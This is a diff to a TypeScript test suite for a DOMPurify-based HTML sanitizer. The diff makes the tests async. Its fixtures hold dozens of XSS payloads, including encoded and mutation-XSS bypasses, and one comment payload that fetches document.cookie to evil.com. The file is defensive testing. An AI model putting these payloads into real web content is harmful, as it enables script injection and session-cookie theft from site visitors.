@@ -28,46 +28,46 @@ import { DOMPurify, DEFAULT_ALLOWED_TAGS, DEFAULT_ALLOWED_ATTRIBUTES } from '@/s
 
 describe('XSS Prevention - HTML Sanitizer', () => {
   describe('Basic Script Injection', () => {
-    test('should strip <script> tags', () => {
+    test('should strip <script> tags', async () => {
       const malicious = '<script>alert("XSS")</script>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip <script> tags with content', () => {
+    test('should strip <script> tags with content', async () => {
       const malicious = '<p>Hello</p><script>document.cookie</script><p>World</p>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).not.toContain('document.cookie');
       expect(sanitized).toContain('Hello');
       expect(sanitized).toContain('World');
     });
 
-    test('should strip <script> with uppercase tags', () => {
+    test('should strip <script> with uppercase tags', async () => {
       const malicious = '<SCRIPT>alert("XSS")</SCRIPT>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('SCRIPT');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip <script> with mixed case', () => {
+    test('should strip <script> with mixed case', async () => {
       const malicious = '<ScRiPt>alert("XSS")</sCrIpT>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('script');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip <script> with whitespace', () => {
+    test('should strip <script> with whitespace', async () => {
       const malicious = '<script\n>alert("XSS")</script>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('<script');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should prevent multi-character bypass', () => {
+    test('should prevent multi-character bypass', async () => {
       const malicious = '<scr<script>ipt>alert("XSS")</scr</script>ipt>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       // DOMPurify strips the <script> tags, leaving escaped text (safe)
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).not.toContain('<scr');
@@ -77,91 +77,91 @@ describe('XSS Prevention - HTML Sanitizer', () => {
   });
 
   describe('Event Handler Injection', () => {
-    test('should strip onerror event handler', () => {
+    test('should strip onerror event handler', async () => {
       const malicious = '<img src="x" onerror="alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip onload event handler', () => {
+    test('should strip onload event handler', async () => {
       const malicious = '<body onload="alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onload');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip onclick event handler', () => {
+    test('should strip onclick event handler', async () => {
       const malicious = '<a href="#" onclick="alert(\'XSS\')">Click me</a>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onclick');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip onmouseover event handler', () => {
+    test('should strip onmouseover event handler', async () => {
       const malicious = '<div onmouseover="alert(\'XSS\')">Hover me</div>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onmouseover');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip onerror with uppercase', () => {
+    test('should strip onerror with uppercase', async () => {
       const malicious = '<img src="x" ONERROR="alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('ONERROR');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip event handlers with newlines', () => {
+    test('should strip event handlers with newlines', async () => {
       const malicious = '<img src="x"\nonerror="alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Protocol-based Injection', () => {
-    test('should strip javascript: protocol in href', () => {
+    test('should strip javascript: protocol in href', async () => {
       const malicious = '<a href="javascript:alert(\'XSS\')">Click me</a>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip javascript: protocol in src', () => {
+    test('should strip javascript: protocol in src', async () => {
       const malicious = '<img src="javascript:alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should block data: protocol with script content', () => {
+    test('should block data: protocol with script content', async () => {
       const malicious = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       // Our secure sanitizer blocks data: URIs by default (ALLOWED_URI_REGEXP)
       expect(sanitized).not.toContain('data:text/html');
       expect(sanitized).not.toContain('alert');
       // Image tag may remain but without dangerous src
     });
 
-    test('should strip vbscript: protocol', () => {
+    test('should strip vbscript: protocol', async () => {
       const malicious = '<a href="vbscript:msgbox(\'XSS\')">Click me</a>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('vbscript:');
       expect(sanitized).not.toContain('msgbox');
     });
 
-    test('should allow safe http/https protocols', () => {
+    test('should allow safe http/https protocols', async () => {
       const safe = '<a href="https://example.com">Safe link</a>';
-      const sanitized = DOMPurify.sanitize(safe);
+      const sanitized = await DOMPurify.sanitize(safe);
       expect(sanitized).toContain('https://example.com');
       expect(sanitized).toContain('Safe link');
     });
 
-    test('should block URL-encoded protocol bypass attempt', () => {
+    test('should block URL-encoded protocol bypass attempt', async () => {
       const malicious = '<a href="java%0ascript:alert(\'XSS\')">Click me</a>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       // Our ALLOWED_URI_REGEXP blocks non-standard protocols including encoded ones
       expect(sanitized).not.toContain('java');
       expect(sanitized).not.toContain('alert');
@@ -170,134 +170,134 @@ describe('XSS Prevention - HTML Sanitizer', () => {
   });
 
   describe('HTML Entity Encoding Bypasses', () => {
-    test('should handle HTML entity encoded script tags', () => {
+    test('should handle HTML entity encoded script tags', async () => {
       const malicious = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       // Entities should remain as-is (not decoded and executed)
       expect(sanitized).not.toContain('<script>');
     });
 
-    test('should handle hex-encoded characters', () => {
+    test('should handle hex-encoded characters', async () => {
       const malicious = '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should handle mixed encoding', () => {
+    test('should handle mixed encoding', async () => {
       const malicious = '<img src="x" onerror="&#x61;lert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('SVG-based XSS', () => {
-    test('should strip malicious SVG with script', () => {
+    test('should strip malicious SVG with script', async () => {
       const malicious = '<svg><script>alert("XSS")</script></svg>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip SVG with onload event', () => {
+    test('should strip SVG with onload event', async () => {
       const malicious = '<svg onload="alert(\'XSS\')"></svg>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onload');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip SVG with embedded JavaScript', () => {
+    test('should strip SVG with embedded JavaScript', async () => {
       const malicious = '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' xmlns:xlink=\'http://www.w3.org/1999/xlink\'><script>alert(\'XSS\')</script></svg>"></use></svg>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Form-based Injection', () => {
-    test('should strip form with action pointing to javascript:', () => {
+    test('should strip form with action pointing to javascript:', async () => {
       const malicious = '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip formaction attribute', () => {
+    test('should strip formaction attribute', async () => {
       const malicious = '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Iframe-based Injection', () => {
-    test('should strip iframe with srcdoc containing script', () => {
+    test('should strip iframe with srcdoc containing script', async () => {
       const malicious = '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip iframe with javascript: src', () => {
+    test('should strip iframe with javascript: src', async () => {
       const malicious = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Object and Embed Tags', () => {
-    test('should strip object tag with malicious data', () => {
+    test('should strip object tag with malicious data', async () => {
       const malicious = '<object data="javascript:alert(\'XSS\')"></object>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should strip embed tag with malicious src', () => {
+    test('should strip embed tag with malicious src', async () => {
       const malicious = '<embed src="javascript:alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Meta Tag Refresh Attacks', () => {
-    test('should strip meta refresh with javascript:', () => {
+    test('should strip meta refresh with javascript:', async () => {
       const malicious = '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Link Tag Attacks', () => {
-    test('should strip link with javascript: href', () => {
+    test('should strip link with javascript: href', async () => {
       const malicious = '<link rel="stylesheet" href="javascript:alert(\'XSS\')">';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Mutation XSS (mXSS)', () => {
-    test('should prevent mXSS with svg and foreignObject', () => {
+    test('should prevent mXSS with svg and foreignObject', async () => {
       const malicious = '<svg><foreignObject><p>Hello<iframe src="javascript:alert(\'XSS\')"></iframe></p></foreignObject></svg>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should prevent mXSS with noscript', () => {
+    test('should prevent mXSS with noscript', async () => {
       const malicious = '<noscript><p title="</noscript><img src=x onerror=alert(\'XSS\')>"></noscript>';
-      const sanitized = DOMPurify.sanitize(malicious);
+      const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
     });
   });
 
   describe('Context-specific Sanitization', () => {
-    test('should strip all tags including scripts with sanitizeToText', () => {
+    test('should strip all tags including scripts with sanitizeToText', async () => {
       const input = '<p>Hello</p><script>alert("XSS")</script>';
-      const sanitized = DOMPurify.sanitizeToText(input);
+      const sanitized = await DOMPurify.sanitizeToText(input);
       // Our sanitizeToText method strips ALL HTML including script tags AND their content
       expect(sanitized).not.toContain('<p>');
       expect(sanitized).not.toContain('<script>');
@@ -306,9 +306,9 @@ describe('XSS Prevention - HTML Sanitizer', () => {
       expect(sanitized).toBe('Hello'); // Clean output
     });
 
-    test('should allow specific safe tags only', () => {
+    test('should allow specific safe tags only', async () => {
       const input = '<p>Hello</p><script>alert("XSS")</script><b>World</b>';
-      const sanitized = DOMPurify.sanitize(input, {
+      const sanitized = await DOMPurify.sanitize(input, {
         ALLOWED_TAGS: ['p', 'b'],
       });
       expect(sanitized).toContain('<p>Hello</p>');
@@ -317,9 +317,9 @@ describe('XSS Prevention - HTML Sanitizer', () => {
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should use DEFAULT_ALLOWED_TAGS configuration', () => {
+    test('should use DEFAULT_ALLOWED_TAGS configuration', async () => {
       const input = '<p>Text</p><h1>Header</h1><script>alert("XSS")</script>';
-      const sanitized = DOMPurify.sanitize(input, {
+      const sanitized = await DOMPurify.sanitize(input, {
         ALLOWED_TAGS: DEFAULT_ALLOWED_TAGS,
       });
       expect(sanitized).toContain('<p>Text</p>');
@@ -328,9 +328,9 @@ describe('XSS Prevention - HTML Sanitizer', () => {
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should use DEFAULT_ALLOWED_ATTRIBUTES configuration', () => {
+    test('should use DEFAULT_ALLOWED_ATTRIBUTES configuration', async () => {
       const input = '<a href="https://example.com" onclick="alert(\'XSS\')">Link</a>';
-      const sanitized = DOMPurify.sanitize(input, {
+      const sanitized = await DOMPurify.sanitize(input, {
         ALLOWED_TAGS: ['a'],
         ALLOWED_ATTR: DEFAULT_ALLOWED_ATTRIBUTES,
       });
@@ -341,68 +341,69 @@ describe('XSS Prevention - HTML Sanitizer', () => {
   });
 
   describe('Real-world Attack Vectors', () => {
-    test('should prevent XSS in user comments', () => {
+    test('should prevent XSS in user comments', async () => {
       const userComment = 'Great article! <img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
-      const sanitized = DOMPurify.sanitize(userComment);
+      const sanitized = await DOMPurify.sanitize(userComment);
       expect(sanitized).toContain('Great article!');
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('fetch');
       expect(sanitized).not.toContain('evil.com');
     });
 
-    test('should prevent XSS in markdown content', () => {
+    test('should prevent XSS in markdown content', async () => {
       const markdown = '# Hello\n\n<script>alert("XSS")</script>\n\nWorld';
-      const sanitized = DOMPurify.sanitize(markdown);
+      const sanitized = await DOMPurify.sanitize(markdown);
       expect(sanitized).toContain('Hello');
       expect(sanitized).toContain('World');
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should prevent XSS in search queries displayed back', () => {
+    test('should prevent XSS in search queries displayed back', async () => {
       const searchQuery = '<img src=x onerror=alert(document.domain)>';
-      const sanitized = DOMPurify.sanitizeToText(searchQuery);
+      const sanitized = await DOMPurify.sanitizeToText(searchQuery);
       expect(sanitized).not.toContain('<img');
       expect(sanitized).not.toContain('onerror');
       // Text content may remain but without HTML context it's safe
     });
 
-    test('should handle empty input', () => {
+    test('should handle empty input', async () => {
       const empty = '';
-      const sanitized = DOMPurify.sanitize(empty);
+      const sanitized = await DOMPurify.sanitize(empty);
       expect(sanitized).toBe('');
     });
 
-    test('should handle null/undefined gracefully', () => {
+    test('should handle null/undefined gracefully', async () => {
       // DOMPurify converts non-strings to strings
-      const sanitized = DOMPurify.sanitize(null as any);
+      const sanitized = await DOMPurify.sanitize(null as any);
       expect(typeof sanitized).toBe('string');
     });
   });
 
   describe('Performance and Edge Cases', () => {
-    test('should handle very long strings', () => {
+    test('should handle very long strings', async () => {
       const longString = '<p>' + 'a'.repeat(10000) + '</p>';
-      const sanitized = DOMPurify.sanitize(longString);
+      const sanitized = await DOMPurify.sanitize(longString);
       expect(sanitized).toContain('<p>');
       expect(sanitized.length).toBeGreaterThan(10000);
     });
 
-    test('should handle deeply nested tags', () => {
+    test('should handle deeply nested tags', async () => {
       const nested = '<div>'.repeat(100) + 'content' + '</div>'.repeat(100);
-      const sanitized = DOMPurify.sanitize(nested);
+      const sanitized = await DOMPurify.sanitize(nested);
       expect(sanitized).toContain('content');
     });
 
-    test('should handle malformed HTML', () => {
+    test('should handle malformed HTML', async () => {
       const malformed = '<p>Hello<script>alert("XSS")</p>';
-      const sanitized = DOMPurify.sanitize(malformed);
+      const sanitized = await DOMPurify.sanitize(malformed);
       expect(sanitized).toContain('Hello');
       expect(sanitized).not.toContain('alert');
     });
 
-    test('should verify DOMPurify is supported', () => {
-      expect(DOMPurify.isSupported()).toBe(true);
+    test('should verify DOMPurify is supported', async () => {
+      const isSupported = await DOMPurify.isSupported();
+      expect(isSupported).toBe(true);
     });
   });
 });
